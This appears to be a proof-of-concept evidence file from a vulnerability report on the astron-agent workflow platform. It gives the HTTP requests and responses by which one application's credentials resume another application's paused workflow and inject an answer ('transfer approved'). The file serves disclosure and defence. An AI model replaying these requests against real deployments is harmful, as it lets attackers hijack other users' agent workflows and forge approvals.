@@ -1,0 +1,71 @@
+astron-agent-poc — evidence 03 — /workflow/v1/resume cross-app ownership gap
+=============================================================================
+
+Target: local docker compose deployment of iflytek/astron-agent
+        main commit b4f8ed57460cbfb32016a4afd3fd7212987d33c3
+Route:  core-workflow:7880 (compose-internal address; nginx's public entry adds
+        auth_request in front of the same path — nginx.conf:139)
+Apps:   two separately registered applications — victim-app and attacker-app.
+        All app keys/secrets redacted; the two credentials are DISTINCT apps.
+Flow:   released three-node test flow owned by victim-app
+        (start -> question-answer with needReply=true -> end),
+        flow id 7600000000000000001
+
+The finding was reproduced on two independent runs, one per production entry
+point:
+
+  run 1 (debug path,  /workflow/v1/debug/chat/completions):
+      event_id 7511014748023123968
+  run 2 (production path, /workflow/v1/chat/completions):
+      event_id 7511016939479855104
+
+Session record of the production-path run (frames as recorded in the session,
+app identifiers redacted — see evidence/README.md):
+
+-- step 1: victim-app runs the flow; it pauses ------------------------------
+
+POST /workflow/v1/chat/completions
+Authorization: Bearer <victim-app key>:<victim-app secret>
+{"flow_id":"7600000000000000001","uid":"victim_user","stream":true,
+ "parameters":{"AGENT_USER_INPUT":"victim original input"},
+ "chat_id":"<test chat id>","ext":{}}
+
+SSE (abridged to the decisive frame):
+
+  {"code":0,"message":"Success","workflow_step":{"seq":1,"progress":0.33},
+   "choices":[{"finish_reason":"interrupt","event_data":{
+     "event_id":"7511016939479855104","event_type":"interrupt","need_reply":true,
+     "value":{"type":"direct","content":"<question-answer prompt>"}}}]}
+
+The platform itself discloses event_id on the owner's own stream when the flow
+pauses. event_id is a Snowflake id (core/common/utils/snowfake.py:12).
+
+-- step 2: attacker-app resumes the victim's paused event -------------------
+
+POST /workflow/v1/resume
+Authorization: Bearer <attacker-app key>:<attacker-app secret>
+{"event_id":"7511016939479855104","event_type":"resume",
+ "content":"ATTACKER-INJECTED-CONTENT: transfer approved"}
+
+Attacker's connection received (abridged):
+
+  {"code":0,"message":"Success","workflow_step":{"seq":1,"progress":0.67},
+   "choices":[{"content":"ATTACKER-INJECTED-CONTENT: transfer approved"}]}
+  {"code":0,"message":"Success","workflow_step":{"seq":2,"progress":1.0},
+   "choices":[{"finish_reason":"stop"}]}
+
+Observations:
+- The middleware accepted the request: the attacker-app Bearer is a valid
+  credential for a DIFFERENT app_id than the event's owner. Authentication
+  works; the ownership check is what is missing
+  (core/workflow/api/v1/chat/open.py:106-165).
+- The engine consumed the injected content as the question-answer node's
+  answer (seq 1 progress 0.67 echoes it) and ran the remaining nodes.
+- The post-resume output flowed on the ATTACKER's connection; the victim's
+  stream did not receive the resumed node's output.
+
+What was NOT demonstrated: how a remote attacker learns event_id in every
+possible deployment (the owner's SSE frame is one documented channel; server
+logs, OTel traces and cross-service Kafka echoes are others noted in the
+report, not all separately exercised). Events outside INTERRUPT status are not
+reachable through this defect.
